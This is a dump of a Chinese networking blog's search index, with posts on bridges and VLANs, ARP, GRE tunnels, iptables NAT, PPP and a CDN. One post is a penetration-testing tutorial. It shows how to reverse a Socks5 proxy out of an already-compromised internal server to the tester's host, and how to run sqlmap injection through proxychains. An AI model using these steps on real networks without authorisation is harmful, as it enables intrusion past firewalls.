博客，请务必保留此出处http://tianhaoblog.blog.51cto.com/6467511/1280163","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"关于linux 802","slug":"NETWORK/关于linux 802.1d (bridge) 和 802.1q(vlan) 实现的再思考","date":"2019-08-29T04:16:16.229Z","updated":"2019-08-29T04:14:25.606Z","comments":true,"path":"NETWORK/关于linux 802.1d (bridge) 和 802.1q(vlan) 实现的再思考.html","link":"","permalink":"http://demonelf.github.io/NETWORK/关于linux 802.1d (bridge) 和 802.1q(vlan) 实现的再思考.html","excerpt":"​ linux bridge - (brctl)实现了ieee 802.1d协议，这个实现，应该是不能支持VLAN的功能。也就是说，这个实现，只能承载一个广播域，而不能承载多个广播域。当然，可以创建多个bridge device，每个bridge都对应不同的vlan，在bridge内部，包通过fdb表来转发，但是这个fdb表里面并没有vlan的信息。如果要在多个bridge device之间通信，比必须在bridge device上创建vlan interface，然后配置路由，这样可以实现不同bridge之间的转发。​ linux vlan - (vconfig)实现了ieee 802.1q协议。802.1q本来应该是一个二层协议，但是linux的实现需要创建vlan interface,而且可以在vlan interface上配置ip地址。所以，这个interface可以放到路由表里面。一般来说，在这个interface上收到的包，会带这个interface配置的vlan id，而从这个interface发出去的包，会打上这个interface的vlan id. ​ 举一个例子。一个盒子有6个物理interface, eth0,eth1,eth2,eth3,eth4,eth5,eth6.​ bridge0 { eth0, eth1, eth2 }, vlan id 是2​ bridge1 { eth3, eth4, eth5 }, vlan id 是3​ eth0,eth1,eth2,eth3,eth4,eth5都在混杂模式，并且没有ip地址，它们是bridge的port.​ 创建vlan interface, bridge0.2, bridge1.3。在bridge0.2和bridge1.3上配置ip地址。vlan 2的机器，把bridge0.2的地址设置为缺省网关；vlan 3的机器，把bridge1.3设置为缺省网关。当有包要从vlan 2发往vlan 3是，它将送到bridge0.2，然后，通过路由，找到bridge1.3，然后由bridge1.3发出去。这个过程中，packet里面的vlan id会发生改变。​ 这个例子里面，要求从bridge port上收到的包都必须是打tag的，在bridge里面，并不能识别和处理tag，只有到三层的vlan interface才能识别并处理这些tag.在bridge是还会运行STP协议来消除回环，进而实现了link一级的HA。STP，RSTP都是没有vlan的概念，而后来的PVST,PVST+，以及MSTP等，都能识别vlan，并且能消除一个vlan里面的回环。 关于Bridge，可以参考：http://www.linuxfoundation.org/en/Net:Bridge关于Vlan,可以参考：http://www.candelatech.com/~greear/vlan.html关于STP，可以参考：http://en.wikipedia.org/wiki/Spanning_tree_protocol","text":"​ linux bridge - (brctl)实现了ieee 802.1d协议，这个实现，应该是不能支持VLAN的功能。也就是说，这个实现，只能承载一个广播域，而不能承载多个广播域。当然，可以创建多个bridge device，每个bridge都对应不同的vlan，在bridge内部，包通过fdb表来转发，但是这个fdb表里面并没有vlan的信息。如果要在多个bridge device之间通信，比必须在bridge device上创建vlan interface，然后配置路由，这样可以实现不同bridge之间的转发。​ linux vlan - (vconfig)实现了ieee 802.1q协议。802.1q本来应该是一个二层协议，但是linux的实现需要创建vlan interface,而且可以在vlan interface上配置ip地址。所以，这个interface可以放到路由表里面。一般来说，在这个interface上收到的包，会带这个interface配置的vlan id，而从这个interface发出去的包，会打上这个interface的vlan id. ​ 举一个例子。一个盒子有6个物理interface, eth0,eth1,eth2,eth3,eth4,eth5,eth6.​ bridge0 { eth0, eth1, eth2 }, vlan id 是2​ bridge1 { eth3, eth4, eth5 }, vlan id 是3​ eth0,eth1,eth2,eth3,eth4,eth5都在混杂模式，并且没有ip地址，它们是bridge的port.​ 创建vlan interface, bridge0.2, bridge1.3。在bridge0.2和bridge1.3上配置ip地址。vlan 2的机器，把bridge0.2的地址设置为缺省网关；vlan 3的机器，把bridge1.3设置为缺省网关。当有包要从vlan 2发往vlan 3是，它将送到bridge0.2，然后，通过路由，找到bridge1.3，然后由bridge1.3发出去。这个过程中，packet里面的vlan id会发生改变。​ 这个例子里面，要求从bridge port上收到的包都必须是打tag的，在bridge里面，并不能识别和处理tag，只有到三层的vlan interface才能识别并处理这些tag.在bridge是还会运行STP协议来消除回环，进而实现了link一级的HA。STP，RSTP都是没有vlan的概念，而后来的PVST,PVST+，以及MSTP等，都能识别vlan，并且能消除一个vlan里面的回环。 关于Bridge，可以参考：http://www.linuxfoundation.org/en/Net:Bridge关于Vlan,可以参考：http://www.candelatech.com/~greear/vlan.html关于STP，可以参考：http://en.wikipedia.org/wiki/Spanning_tree_protocol posted on 2011-03-23 18:04 flyonok","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"使用ARP的四种典型情况","slug":"NETWORK/使用ARP的四种典型情况","date":"2019-08-29T04:16:16.198Z","updated":"2019-08-29T04:14:14.962Z","comments":true,"path":"NETWORK/使用ARP的四种典型情况.html","link":"","permalink":"http://demonelf.github.io/NETWORK/使用ARP的四种典型情况.html","excerpt":"使用ARP的四种典型情况 1.发送方是主机，把IP数据包发送到本网络上的另一个主机。这时用ARP找到目的主机的硬件MAC地址。 2.发送方是主机，要把IP数据报发送到另一个网络上的主机。这时用ARP找到本网络上的一个路由器（网关）的硬件MAC地址。剩下的工作由这个路由器来完成。","text":"使用ARP的四种典型情况 1.发送方是主机，把IP数据包发送到本网络上的另一个主机。这时用ARP找到目的主机的硬件MAC地址。 2.发送方是主机，要把IP数据报发送到另一个网络上的主机。这时用ARP找到本网络上的一个路由器（网关）的硬件MAC地址。剩下的工作由这个路由器来完成。 3.发送方是路由器，要把IP数据报转发到本网络上的一个主机。这时用ARP找到目的主机的硬件MAC地址 4.发送方是路由器，要把IP数据报转发到另一个网络的一个主机。这时用ARP找到本网络上的一个路由器（网关）的硬件地址。剩下的工作有这个路由器来完成。 主机和路由器表现的行为是一致的，区别在于，路由器可以作为网关，而PC不可以。当要把IP数据报转发另一个网络的一个主机时，ARP找到本网络上的一个网关的硬件MAC地址，这个网关可以是路由器，也可以是三层交换机。 纯二层交换机是没有ARP表项的。交换机是否有ARP表项取决于交换机是否作为三层设备（配置三层路由接口或SVI接口） 网络层使用的是IP地址，但在实际网络的链路上传送数据帧时，最终必须使用该网络的硬件地址。 每一个主机都设有一个ARP高速缓存，里面有本局域网上的各主机和网关的IP地址到硬件地址的映射表。也就是说，一个主机可以通过ARP到本局域网的其他主机，到达其他网络主机的工作交给网关完成。 同一子网 源目mac地址都不会改变 不同子网 源目IP地址都不会改变，改变源目MAC地址","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"linux 下创建GRE隧道","slug":"NETWORK/linux 下创建GRE隧道","date":"2019-08-29T04:16:16.198Z","updated":"2019-08-29T04:13:44.705Z","comments":true,"path":"NETWORK/linux 下创建GRE隧道.html","link":"","permalink":"http://demonelf.github.io/NETWORK/linux 下创建GRE隧道.html","excerpt":"其他国家的互联网如同一个孤岛。要想访问国外网站异常的缓慢，甚至被和谐了。可以建立一条隧道来避免这种情况，下面说说GRE隧道如何建立。 GRE介绍GRE隧道是一种IP-over-IP的隧道，是通用路由封装协议，可以对某些网路层协议的数据报进行封装，使这些被封装的数据报能够在IPv4/IPv6 网络中传输。Tunnel 是一个虚拟的点对点的连接，提供了一条通路使封装的数据报文能够在这个通路上传输，并且在一个Tunnel 的两端分别对数据报进行封装及解封装。 一个X协议的报文要想穿越IP网络在Tunnel中传输，必须要经过加封装与解封装两个过程。要在Linux上创建GRE隧道，需要ip_gre内核模块，它是GRE通过IPv4隧道的驱动程序。 查看是否有加载ip_gre模块 12345678# modprobe ip_gre# lsmod | grep greip_gre 22432 0gre 12989 1 ip_gre# modprobe ip_gre# lsmod | grep greip_gre 22432 0gre 12989 1 ip_gre 创建步骤环境如下：host A : 121.207.22.123host B: 111.2.33.28在host A上面： 123456# ip tunnel add gre1 mode gre remote 111.2.33.28 local 121.207.22.123 ttl 255# ip link set gre1 up# ip addr add 10.10.10.1 peer 10.10.10.2 dev gre1# ip tunnel add gre1 mode gre remote 111.2.33.28 local 121.207.22.123 ttl 255# ip link set gre1 up# ip addr add 10.10.10.1 peer 10.10.10.2 dev gre1 创建一个GRE类型隧道设备gre0, 并设置对端IP为111.2.33.28。隧道数据包将被从121.207.22.123也就是本地IP地址发起，其TTL字段被设置为255。隧道设备分配的IP地址为10.10.10.1，掩码为255.255.255.0。在host B上面：123456# ip tunnel add gre1 mode gre remote 121.207.22.123 local 111.2.33.28 ttl 255# ip link set gre1 up# ip addr add 10.10.10.2 peer 10.10.10.1 dev gre1# ip tunnel add gre1 mode gre remote 121.207.22.123 local 111.2.33.28 ttl 255# ip link set gre1 up# ip addr add 10.10.10.2 peer 10.10.10.1 dev gre1","text":"其他国家的互联网如同一个孤岛。要想访问国外网站异常的缓慢，甚至被和谐了。可以建立一条隧道来避免这种情况，下面说说GRE隧道如何建立。 GRE介绍GRE隧道是一种IP-over-IP的隧道，是通用路由封装协议，可以对某些网路层协议的数据报进行封装，使这些被封装的数据报能够在IPv4/IPv6 网络中传输。Tunnel 是一个虚拟的点对点的连接，提供了一条通路使封装的数据报文能够在这个通路上传输，并且在一个Tunnel 的两端分别对数据报进行封装及解封装。 一个X协议的报文要想穿越IP网络在Tunnel中传输，必须要经过加封装与解封装两个过程。要在Linux上创建GRE隧道，需要ip_gre内核模块，它是GRE通过IPv4隧道的驱动程序。 查看是否有加载ip_gre模块 12345678# modprobe ip_gre# lsmod | grep greip_gre 22432 0gre 12989 1 ip_gre# modprobe ip_gre# lsmod | grep greip_gre 22432 0gre 12989 1 ip_gre 创建步骤环境如下：host A : 121.207.22.123host B: 111.2.33.28在host A上面： 123456# ip tunnel add gre1 mode gre remote 111.2.33.28 local 121.207.22.123 ttl 255# ip link set gre1 up# ip addr add 10.10.10.1 peer 10.10.10.2 dev gre1# ip tunnel add gre1 mode gre remote 111.2.33.28 local 121.207.22.123 ttl 255# ip link set gre1 up# ip addr add 10.10.10.1 peer 10.10.10.2 dev gre1 创建一个GRE类型隧道设备gre0, 并设置对端IP为111.2.33.28。隧道数据包将被从121.207.22.123也就是本地IP地址发起，其TTL字段被设置为255。隧道设备分配的IP地址为10.10.10.1，掩码为255.255.255.0。在host B上面：123456# ip tunnel add gre1 mode gre remote 121.207.22.123 local 111.2.33.28 ttl 255# ip link set gre1 up# ip addr add 10.10.10.2 peer 10.10.10.1 dev gre1# ip tunnel add gre1 mode gre remote 121.207.22.123 local 111.2.33.28 ttl 255# ip link set gre1 up# ip addr add 10.10.10.2 peer 10.10.10.1 dev gre1 此时，host A 和 host B 建立起GRE隧道了。 检测连通性 12345678910# ping 10.10.10.2 (host A)PING 10.10.10.2 (10.10.10.2) 56(84) bytes of data.64 bytes from 10.10.10.2: icmp_req=1 ttl=64 time=0.319 ms64 bytes from 10.10.10.2: icmp_req=2 ttl=64 time=0.296 ms64 bytes from 10.10.10.2: icmp_req=3 ttl=64 time=0.287 ms# ping 10.10.10.2 (host A)PING 10.10.10.2 (10.10.10.2) 56(84) bytes of data.64 bytes from 10.10.10.2: icmp_req=1 ttl=64 time=0.319 ms64 bytes from 10.10.10.2: icmp_req=2 ttl=64 time=0.296 ms64 bytes from 10.10.10.2: icmp_req=3 ttl=64 time=0.287 ms 撤销GRE隧道在任一一端操作下面命令1234# ip link set gre1 down# ip tunnel del gre1# ip link set gre1 down# ip tunnel del gre1 转载请注明来自运维生存时间: http://www.ttlsa.com/html/4138.html","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"linux-iptables nat设置路由转换","slug":"NETWORK/linux-iptables nat设置路由转换","date":"2019-08-29T04:16:16.198Z","updated":"2019-08-29T04:13:51.065Z","comments":true,"path":"NETWORK/linux-iptables nat设置路由转换.html","link":"","permalink":"http://demonelf.github.io/NETWORK/linux-iptables nat设置路由转换.html","excerpt":"DNAT（Destination Network Address Translation,目的地址转换) 通常被叫做目的映射。而SNAT（Source Network Address Translation，源地址转换）通常被叫做源映射。 这是我们在设置Linux网关或者防火墙时经常要用来的两种方式。以前对这两个都解释得不太清楚，现在我在这里解释一下。 首先，我们要了解一下IP包的结构，如下图所示：在任何一个IP数据包中，都会有Source IP Address与Destination IP Address这两个字段，数据包所经过的路由器也是根据这两个字段是判定数据包是由什么地方发过来的，它要将数据包发到什么地方去。而iptables的DNAT与SNAT就是根据这个原理，对Source IP Address与Destination IP Address进行修改。","text":"DNAT（Destination Network Address Translation,目的地址转换) 通常被叫做目的映射。而SNAT（Source Network Address Translation，源地址转换）通常被叫做源映射。 这是我们在设置Linux网关或者防火墙时经常要用来的两种方式。以前对这两个都解释得不太清楚，现在我在这里解释一下。 首先，我们要了解一下IP包的结构，如下图所示：在任何一个IP数据包中，都会有Source IP Address与Destination IP Address这两个字段，数据包所经过的路由器也是根据这两个字段是判定数据包是由什么地方发过来的，它要将数据包发到什么地方去。而iptables的DNAT与SNAT就是根据这个原理，对Source IP Address与Destination IP Address进行修改。 然后，我们再看看数据包在iptables中要经过的链（chain）： 图中正菱形的区域是对数据包进行判定转发的地方。在这里，系统会根据IP数据包中的destination ip address中的IP地址对数据包进行分发。如果destination ip adress是本机地址，数据将会被转交给INPUT链。如果不是本机地址，则交给FORWARD链检测。这也就是说，我们要做的DNAT要在进入这个菱形转发区域之前，也就是在PREROUTING链中做，比如我们要把访问202.103.96.112的访问转发到192.168.0.112上： iptables -t nat -A PREROUTING -d 202.103.96.112 -j DNAT –to-destination 192.168.0.112 这个转换过程当中，其实就是将已经达到这台linux网关（防火墙）上的数据包上的destination ip address从202.103.96.112修改为192.168.0.112然后交给系统路由进行转发。 而SNAT自然是要在数据包流出这台机器之前的最后一个链也就是POSTROUTING链来进行操作 iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -j SNAT –to-source 58.20.51.66 这个语句就是告诉系统把即将要流出本机的数据的source ip address修改成为58.20.51.66。这样，数据包在达到目的机器以后，目的机器会将包返回到58.20.51.66也就是本机。如果不做这个操作，那么你的数据包在传递的过程中，reply的包肯定会丢失。 假如当前系统用的是ADSL/3G/4G动态拨号方式，那么每次拨号，出口IP都会改变，SNAT就会有局限性。 iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o eth0 -j MASQUERADE 重点在那个『 MASQUERADE 』！这个设定值就是『IP伪装成为封包出去(-o)的那块装置上的IP』！不管现在eth0的出口获得了怎样的动态ip，MASQUERADE会自动读取eth0现在的ip地址然后做SNAT出去，这样就实现了很好的动态SNAT地址转换。 补充：这里防火墙要进行转发必须打开内核路由转发功能，即： echo “1” &gt; /proc/sys/net/ipv4/ip_forward //开启路由转发sysctl -p //使能sysctl设置输出：net.ipv4.ip_forward = 1 //这里为1，开启转发成功。net.ipv4.conf.default.rp_filter = 1net.ipv4.conf.default.accept_source_route = 0kernel.sysrq = 0kernel.core_uses_pid = 1………… 问题： echo “1” &gt; /proc/sys/net/ipv4/ip_forwardcat /proc/sys/net/ipv4/ip_forward [root@Coohx ~]# sysctl -pnet.ipv4.ip_forward = 0 // 应该为1！！！！net.ipv4.conf.default.rp_filter = 1net.ipv4.conf.default.accept_source_route = 0kernel.sysrq = 0kernel.core_uses_pid = 1 解决办法： vim /etc/sysctl.conf将 net.ipv4.ip_forward = 0改为 net.ipv4.ip_forward = 1[root@Coohx ~]# sysctl -pnet.ipv4.ip_forward = 1 // 一直为1………… 注：手动修改/proc/sys/net/ipv4/ip_forward 0为1 ，内核不允许 &quot;/proc/sys/net/ipv4/ip_forward&quot; 警告: 此文件自读入后已发生变动！！！ 确实要写入吗 (y/n)?y &quot;/proc/sys/net/ipv4/ip_forward&quot; E667: 同步失败 请按 ENTER 或其它命令继续","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"nat穿透","slug":"NETWORK/nat穿透","date":"2019-08-29T04:16:16.198Z","updated":"2019-08-29T04:13:59.001Z","comments":true,"path":"NETWORK/nat穿透.html","link":"","permalink":"http://demonelf.github.io/NETWORK/nat穿透.html","excerpt":"作者：陈军链接：https://www.zhihu.com/question/38729355/answer/77877260 来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","text":"作者：陈军链接：https://www.zhihu.com/question/38729355/answer/77877260 来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ​ NAT分为两大类，基本的NAT和NAPT（Network Address/Port Translator）。基本的NAT，它仅将内网主机的私有IP地址转换成公网IP地址，但并不将TCP/UDP端口信息进行转换，有动态与静态之区分。由于现在大部分都属于另一种类型，即NAPT，故这里不详细讨论基础NAT。 另外一种NAT叫做NAPT（Network Address/Port Translator），从名称上我们也可以看得出，NAPT不但会改变经过这个NAT设备的IP数据报的IP地址，还会改变IP数据报的TCP/UDP端口。 ​ NAPT又分为锥型（Cone）和对称型（Symmetric），它们的区别在于，在NAT已分配端口号给Client A的情况下，如果Client A继续用1235端口与另一外网服务器通讯，锥型NAT还会继续用原来62000端口，即所分配的端口号不变。而对于对等型NAT，NAT将会分配另一端口号（如62001）给Client A的1235端口。也就是说，同一内网主机同一端口号，对于锥型NAT，无论与哪一外网主机通讯，都不改变所分配的端口号；而对于对等型NAT，同一内网主机同一端口号，每一次与不同的外网主机通讯，就重新分配另一个端口号。 ​ 目前比较常用的NAT类型是完全锥型NAT。 首先目前绝大多数的路由器都是非对称型NAT(Cone NAT)，所以P2P技术才能正常使用。 对称/非对称的区别主要在于：网关设备在实现NAT时，对于内网某主机的若干个UDP连接请求，网关设备对应地在外网上所建立的UDP端口数量。对称NAT是一个请求对应一个端口，非对称NAT是多个请求对应一个端口(象锥形，所以叫Cone NAT)。 对称型NAT(Symmetric NAT)是无法实现P2P技术。 ​ 对于两方都是对称nat的情况，至少从可以了解的途径上（比如google，相关论坛）都没找到解决方案，我们自己也进行过测试，不行。 ​ 但是对于一端是对称nat，一端是端口限制性Cone nat的情况是可以打洞成功的，特别是我们实验的对称nat的端口变化还是有规律的（加1），我们使用端口猜测的方法进行打洞成功率还是非常高的。对于端口变化无规律的对称nat，这个猜测还是靠算法的设计， 可以看看A New Method for Symmetric NAT Traversal in UDP and TCP （http://www.goto.info.waseda.ac.jp/~wei/file/wei-apan-v10.pdf）","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"三层交换机路由设计方案","slug":"NETWORK/三层交换机路由设计方案","date":"2019-08-29T04:16:16.198Z","updated":"2019-08-29T04:14:06.065Z","comments":true,"path":"NETWORK/三层交换机路由设计方案.html","link":"","permalink":"http://demonelf.github.io/NETWORK/三层交换机路由设计方案.html","excerpt":"","text":"","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"Linux PPP 框架分析","slug":"NETWORK/Linux PPP 框架分析","date":"2019-08-29T04:16:16.182Z","updated":"2019-08-29T04:13:31.024Z","comments":true,"path":"NETWORK/Linux PPP 框架分析.html","link":"","permalink":"http://demonelf.github.io/NETWORK/Linux PPP 框架分析.html","excerpt":"介绍 通过对Linux源代码的分析,了解PPP设备在linux内的工作原理.顺便了解一下PPPoE如何利用PPP设备来完成上网的工作的.下面是代码研究的基础版本： Software versionLinux内核 2.6.15PPPd ppp-2.4.3PPPoE rp-pppoe-3.8","text":"介绍 通过对Linux源代码的分析,了解PPP设备在linux内的工作原理.顺便了解一下PPPoE如何利用PPP设备来完成上网的工作的.下面是代码研究的基础版本： Software versionLinux内核 2.6.15PPPd ppp-2.4.3PPPoE rp-pppoe-3.8 PPP相关模块及结构 注：每个模块左上角或右上角蓝色字体的数字是用来方便区别每个模块。 每个层次及工作在该层次的程序（模块）分析如下： 2.1 应用层模块概述 工作在该层的模块编号：（1）Pppd、（2）Pppoe、（10）网络应用程序 2.1.1 Pppd 使用源代码ppp-2.4.3编译生成，该程序用来完成PPP过程（lcp/pap/chap/ipcp等）的应用程序.它和Pppoe两个用户态应用程序配合起来,可以完成PppOe的拨号上网的链路协商及维护. 熟悉Ppp相关协议的知道,Ppp链路协商过程有LCP/PAP/CHAP/PAP等很多协议.这些包会经由协议栈分类,提交到字符设备/dev/ppp0的队列中.而Pppd这个应用程序,就是从ppp0中将这些包读取出来,然后递交到各协议的子过程中去处理,从而在应用态完成这些协议的处理过程. 这里需要提一点,要想深入的理解Pppd应用程序的工作方法,必须要了解字符设备ppp0是如何工作的. 2.1.2 Pppoe 首先,pppoe完成了PPPoE Discovery过程,这个过程很简单,只有PADI/PADO, PADR/PADS四个包.主要目的是相互告知MAC地址. 另外,这个程序负责接收和发送Pppoe链路的所有数据包,包括ppp协议过程的数据包,也包括正常网络应用通过网络接口ppp发送的TCP/IP数据包.在此需要了解类型为0x8863/0x8864的Socket如何工作,另外需要了解数据包如何通过PTY设备在Pppoe和PPP协议栈之间传递的.在内核模块概述中会给予描述. 所以,我们可以将pppoe应用程序作为拨号链接进入主机的入口,所有的数据包都经由它进入主机. 2.1.3 网络应用程序 这里指一般网络应用，比如上网、下载等。主要作用是描述普通数据包的行走路径. 2.2 内核层模块概述 工作在该层的模块编号：（3）/dev/ppp%n、（4）TCP/IP协议栈、（5）Socket、（6）PPP协议栈、（7）PTY设备、（8）ETH1 2.2.1 /dev/ppp%n 该设备需要打开内核支持,可以make menuconfig选择相应的子项,另外需要在/dev目录下创建主设备号为108从设备号为0的字符设备才可以在用户态使用. 创建了ppp设备后，ppp过程的数据包经过协议栈的分类,会被送到该接口的队列内.用户态应用程序(如pppd)从该接口内读取ppp过程的数据包，然后送交相应的协议栈处理.对于响应的数据包,同样可以写入到该设备中,设备内会将数据包送交协议栈然后转发出去. 2.2.2 TCP/IP协议栈 普通Linux TCP/IP协议栈. 2.2.3 Socket PppOe Session和Discovery数据包对应的以太网类型分别为0x8863/0x8864,因为这两种类型的数据包是由Pppoe应用程序通过Socket来收发的,所以内核中需要定义这两种类型的Socket.这两个Socket内核处理非常简单,只做了最基本的检查便由Pppoe收取上来. 2.2.4 PPP协议栈 主要负责PPP层数据的封装、压缩与解压缩.另外,它还对普通数据包和Ppp过程的数据包进行了分流,将普通数据包提交到TCP/IP协议栈,而将Ppp过程的数据包放到/dev/ppp设备队列中,等待Pppd去收取并处理. 2.2.5 PTY设备 串行设备，PPP内核协议栈与pppoe应用程序的中转站.因为Ppp协议早多运行在串行链路上,所以在Linux内核中PPP协议栈与串行设备结合紧密. 2.2.6 Eth1 这里是指连接以太网的出口,用来表示数据包路径而引入. 2.3 物理层模块概述 工作在该层的模块编号：（9）以太网驱动 PPPoE拨号建立的过程 从拨号链接开始到用户可以上网主要分三个过程： Ø PPPoE Discovery过程 Ø PPP过程 Ø 设置上网主机 3.1 PPPoE Discovery 过程","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"Socks代理反弹突破内网","slug":"NETWORK/Socks代理反弹突破内网","date":"2019-08-29T04:16:16.182Z","updated":"2019-08-29T04:13:37.081Z","comments":true,"path":"NETWORK/Socks代理反弹突破内网.html","link":"","permalink":"http://demonelf.github.io/NETWORK/Socks代理反弹突破内网.html","excerpt":"随着信息安全意识的提升，越来越多的信息系统前端均部署有防火墙，系统管理员根据业务需求将内部必要的服务端口通过端口映射等手段映射到公网中，如默认**web服务端口80、MSSQL*数据库服务端口1433等。通过部署防火墙可以将信息系统内部区域与公网逻辑隔离开来，利用相关的策略有效避免或减轻来自外部的攻击。 对于渗透测试者来说，如何绕过防火墙的阻挡在内网展开渗透测试成为亟需解决的问题，本文介绍了在夺取映射到外网的内网服务器权限后，如何利用socks代理反弹获得内网访问权限。 1.sSocks","text":"随着信息安全意识的提升，越来越多的信息系统前端均部署有防火墙，系统管理员根据业务需求将内部必要的服务端口通过端口映射等手段映射到公网中，如默认**web服务端口80、MSSQL*数据库服务端口1433等。通过部署防火墙可以将信息系统内部区域与公网逻辑隔离开来，利用相关的策略有效避免或减轻来自外部的攻击。 对于渗透测试者来说，如何绕过防火墙的阻挡在内网展开渗透测试成为亟需解决的问题，本文介绍了在夺取映射到外网的内网服务器权限后，如何利用socks代理反弹获得内网访问权限。 1.sSocks sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为0.0.13，可在以下链接处下载。 http://sourceforge.net/projects/ssocks/ 下载解压后，执行命令编译。 1./configure &amp;&amp; make 编译完成，进入src目录，会发现有nsocks、ssocksd、ssocks、rcsocks，其功能说明介绍如下： 程序 功能nsocks 类似通过Socks5代理后的netcat，可用来测试socks serverssocksd 用来开启Socks5代理服务ssocks 本地启用Socks5服务，并反弹到另一IP地址rcsocks 接收反弹过来的Socks5服务，并转向另一端口 2.模拟网络环境说明 本文模拟的网络环境见下图1，渗透测试端IP为192.168.10.50，内网区域IP段192.168.206.0/24，内网区域能正常访问192.168.10.0/24，现假设已获得192.168.206.130权限。 3.实施Socks代理反弹1)本地监听端口在渗透测试端192.168.10.50执行 1./rcsocks -l 1088 -p 1080 -vv 等待远程Socks5服务器访问本地1080端口，创建端口1080与本地端口1088的连接通道，如图2。 2)开启Socks5代理服务，反弹在192.168.206.130上执行 1./rssocks -vv -s 192.168.10.50:1080 启用Socks5服务，反弹到192.168.10.50的端口1080上，如图3。 此时在渗透测试端192.168.10.50可看到通道连接成功，效果如图4。 4.利用proxychains进行Socks5代理通过前面的步骤，Socks5代理已创建完成了。由于在渗透测试过程中，需要使用不同的工具程序，而在各程序中分别配置Socks5代理信息较为繁琐，而部分程序并不支持配置Socks5代理。为了简化这些操作，我们可以采用proxychains。proxychains是一个代理客户端软件，可以支持几乎所有程序的代理，如ssh，telnet，ftp等。利用proxychains，程序能在代理的环境下被加载运行，而本身不需要具备代理功能。使用前需要对proxychains进行简单配置，打开配置文件proxychains.conf（在BT5位于/etc/proxychains.conf），如图5所示，在[ProxyList]处添加socks5 127.0.0.1 1088 配置成功后若要启动程序，仅需要在启动程序命令前加上proxychains。1)启用浏览器firefox，在终端执行命令： 1proxychains firefox firefox启动成功，访问192.168.206.135的web服务如图6，通过代理访问成功。 2)利用sqlmap进行注入：先切换到sqlmap目录cd /pentest/database/sqlmapproxychains python sqlmap.py -u “存在SQL注入的链接” –dbs注入成功，注入点信息及获取数据库信息如图7所示。 5.后记由于系统管理员的疏忽或者业务需求所致，防火墙一般仅对由外向内发起的数据连接进行严格判断、过滤、甚至阻断而忽略由内往外的连接。因此，在此种情况下，通过攻陷映射到公网的端口服务，利用反弹便可获取内网访问权限，给内网安全带来极大的威胁。在信息安全建设与运维过程中，不仅要加强映射到公网的服务安全，也要重视由内到外连接的安全威胁。","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"Incapsula免费CDN服务申请使用及加速效果测评","slug":"NETWORK/Incapsula免费CDN服务申请使用及加速效果测评","date":"2019-08-29T04:16:16.182Z","updated":"2019-08-29T04:13:23.344Z","comments":true,"path":"NETWORK/Incapsula免费CDN服务申请使用及加速效果测评.html","link":"","permalink":"http://demonelf.github.io/NETWORK/Incapsula免费CDN服务申请使用及加速效果测评.html","excerpt":"作为差不多和cloudflare一道被国内的站长们认识的Incapsula，其提供的免费CDN加速服务一直可以正常使用，且有多个CDN节点可供选择。而cloudflare提供的免费CDN服务虽然不错，但是不知道是不是因为国内用户用太多了还是其他什么原因，现在用起来总会有各种问题。 Incapsula最早部落是在三年前介绍的，现在之所以要再次分享一下Incapsula的免费CDN申请使用教程，一来是给不是很了解Incapsula的朋友一个简单普及，Incapsula的CDN其实有不少的高级用法；二来是Incapsula最近推出的香港CDN节点，很必要来体验不同的CDN节点在国内连接速度快慢。","text":"作为差不多和cloudflare一道被国内的站长们认识的Incapsula，其提供的免费CDN加速服务一直可以正常使用，且有多个CDN节点可供选择。而cloudflare提供的免费CDN服务虽然不错，但是不知道是不是因为国内用户用太多了还是其他什么原因，现在用起来总会有各种问题。 Incapsula最早部落是在三年前介绍的，现在之所以要再次分享一下Incapsula的免费CDN申请使用教程，一来是给不是很了解Incapsula的朋友一个简单普及，Incapsula的CDN其实有不少的高级用法；二来是Incapsula最近推出的香港CDN节点，很必要来体验不同的CDN节点在国内连接速度快慢。 根据部落自己的统计，Incapsula可供查询的CDN节点共有60多个，主要是分布在美国、爱尔兰、日本、中国香港等地区，由于Incapsula的CDN服务是全球服务网络，因此只要有一个节点缓存了我们的网站，就可以在其它CDN节点上访问了。明白了这一点，我们就可以指定自己的CDN节点为日本或者香港。 一般来说，网站放在亚太地区的话国内用户访问会感觉比美国主机要快一些，本篇文章就来对比一下Incapsula的日本、香港和美国CDN节点在国内的访问连接速度状况。Incapsula以前免费CDN套餐月流量为50GB，刚刚去官网查看了一下发现免费CDN套餐现以已经没有明确说明多少月流量限制。 看了一下Incapsula的付费套餐也都没有月流量限制，区别主要是在防护攻击、CDN高级功能等方面，所以目前姑且认为Incapsula提供免费CDN服务没有流量限制，但是只是基本的CDN加速，应该在CDN资源利用方面作了限制。（部落刚刚狂刷新自己测试博客，有遇到一次超出资源配额提示，由此推测Incapsula在访问连接方面作了人为限制） Incapsula免费CDN服务申请使用:日本、香港、美国CDN加速效果测评 一、Incapsula免费CDN申请使用 1、Incapsula官网： 1、官方网站：http://www.incapsula.com/ 2、进入Incapsula官网，直接注册一个账号，然后登录到Incapsula管理后台，添加一个你想要使用CDN加速的网站。 3、等Incapsula检测你的域名的DNS通过后，就可以点击下一步了。 4、然后Incapsula就会给出A记录和CNAME记录。 